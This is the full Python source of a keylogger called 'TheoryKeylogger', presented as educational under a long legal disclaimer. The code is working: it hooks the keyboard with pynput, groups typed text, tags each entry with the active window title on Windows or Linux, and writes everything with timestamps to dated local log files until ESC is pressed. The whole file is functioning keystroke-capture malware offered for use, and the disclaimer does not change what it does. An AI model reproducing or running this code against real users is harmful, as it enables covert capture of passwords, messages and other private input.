#!/usr/bin/python3
#! coding: utf-8
"""
TheoryKeylogger - An educational project for study and research purposes
Coded by Br3noAraujo

===============================================================================
LEGAL NOTICE AND DISCLAIMER
===============================================================================

1. EDUCATIONAL PURPOSE ONLY
   This software is STRICTLY for educational and research purposes.
   It is designed to help understand how keyloggers work and their potential risks.

2. ILLEGAL USAGE
   Using this software to monitor or collect data from any person or system
   without explicit written consent is ILLEGAL and may result in:
   - Criminal charges
   - Civil lawsuits
   - Heavy fines
   - Imprisonment
   - Other legal consequences

3. NO WARRANTY AND DISCLAIMER
   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
   THE AUTHOR (Br3noAraujo) EXPLICITLY DISCLAIMS ALL LIABILITY FOR:
   - Any misuse of this software
   - Any illegal activities performed with this software
   - Any damages or consequences resulting from the use of this software
   - Any claims or legal actions against users of this software

4. USER RESPONSIBILITY
   By using this software, you acknowledge and agree that:
   - You will use it only for educational purposes
   - You understand the legal implications of misuse
   - You take full responsibility for your actions
   - You will not hold the author liable for any misuse

5. TERMINATION
   The author reserves the right to terminate or restrict access to this software
   for any user who violates these terms.

===============================================================================
By using this software, you explicitly agree to these terms and conditions.
===============================================================================
"""

import pynput
from pynput.keyboard import Key, Listener
import logging
import os
from datetime import datetime
import sys
import threading
import time
from colorama import init, Fore, Style

# Initialize colorama
init()

banner = """
┏┳┓┓          ┓┏┓    ┓          
 ┃ ┣┓┏┓┏┓┏┓┓┏ ┃┫ ┏┓┓┏┃┏┓┏┓┏┓┏┓┏┓
 ┻ ┛┗┗ ┗┛┛ ┗┫ ┛┗┛┗ ┗┫┗┗┛┗┫┗┫┗ ┛ 
            ┛       ┛    ┛ ┛    
"""


# Import window title capture based on OS
if sys.platform == "win32":
    import win32gui
    def get_active_window_title():
        try:
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except:
            return "Unknown Window"
else:
    from Xlib import display
    def get_active_window_title():
        try:
            d = display.Display()
            window = d.get_input_focus().focus
            wmname = window.get_wm_name()
            wmclass = window.get_wm_class()
            if wmname is None:
                wmname = "Unknown"
            if wmclass is None:
                wmclass = "Unknown"
            return f"{wmname} - {wmclass}"
        except:
            return "Unknown Window"

# Logging configuration
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Format date for log filename
current_date = datetime.now().strftime('%Y-%m-%d')
log_file = os.path.join(log_dir, f"keylog_{current_date}.txt")

# Custom formatter for logging
class CustomFormatter(logging.Formatter):
    def formatTime(self, record, datefmt=None):
        ct = datetime.fromtimestamp(record.created)
        if datefmt:
            s = ct.strftime(datefmt)
        else:
            s = ct.strftime('%Y-%m-%d %H:%M:%S')
        return s

# Configure logging with custom formatter
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# File handler
file_handler = logging.FileHandler(log_file)
file_handler.setFormatter(CustomFormatter('%(asctime)s: %(message)s'))
logger.addHandler(file_handler)

# Buffer to store keys
key_buffer = []
buffer_lock = threading.Lock()
last_key_time = time.time()
BUFFER_TIMEOUT = 0.5  # Time in seconds to group keys
current_window = ""

def process_buffer():
    """Process the buffer and save grouped keys"""
    global key_buffer, current_window
    with buffer_lock:
        if key_buffer:
            # Join all keys in the buffer into a single string
            text = ''.join(key_buffer)
            logging.info(f'Window: {current_window} | Typed text: {text}')
            key_buffer = []

def on_press(key):
    global last_key_time, current_window
    current_time = time.time()
    
    # Update current window
    new_window = get_active_window_title()
    if new_window != current_window:
        current_window = new_window
        logging.info(f'Switched to window: {current_window}')
    
    try:
        # If it's a normal key
        if hasattr(key, 'char'):
            with buffer_lock:
                key_buffer.append(key.char)
                last_key_time = current_time
        # If it's a special key
        else:
            special_key = str(key).replace('Key.', '')
            if special_key == 'space':
                with buffer_lock:
                    key_buffer.append(' ')
                    last_key_time = current_time
            elif special_key == 'enter':
                with buffer_lock:
                    key_buffer.append('\n')
                    last_key_time = current_time
            elif special_key == 'backspace':
                with buffer_lock:
                    if key_buffer:
                        key_buffer.pop()
                    last_key_time = current_time
            else:
                logging.info(f'Window: {current_window} | Special key: {special_key}')
                last_key_time = current_time
    except AttributeError:
        logging.info(f'Window: {current_window} | Unrecognized key: {key}')

def on_release(key):
    if key == Key.esc:
        # Process final buffer before exiting
        process_buffer()
        print(f"\n{Fore.CYAN}Program finished. Check the log file at:{Style.RESET_ALL}", log_file)
        return False

def buffer_monitor():
    """Monitor the buffer and process when necessary"""
    while True:
        current_time = time.time()
        if current_time - last_key_time > BUFFER_TIMEOUT:
            process_buffer()
        time.sleep(0.1)

def print_colored_banner():
    """Print the banner with colors"""
    lines = banner.split('\n')
    for line in lines:
        # Replace 💀 with colored version
        colored_line = line.replace('💀', f'{Fore.RED}💀{Style.RESET_ALL}')
        print(f'{Fore.CYAN}{colored_line}{Style.RESET_ALL}')

def main():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Print colored banner
    print_colored_banner()
    
    print(f"\n{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}TheoryKeylogger - Educational Project{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
    print(f"{Style.BRIGHT}{Fore.RED}WARNING: This program is running for educational purposes only.{Style.RESET_ALL}")
    print(f"{Style.BRIGHT}{Fore.RED}Any unauthorized use is strictly prohibited and may result in legal action.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Press ESC to finish the program.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}\n")
    
    # Start buffer monitor in a separate thread
    monitor_thread = threading.Thread(target=buffer_monitor, daemon=True)
    monitor_thread.start()
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()

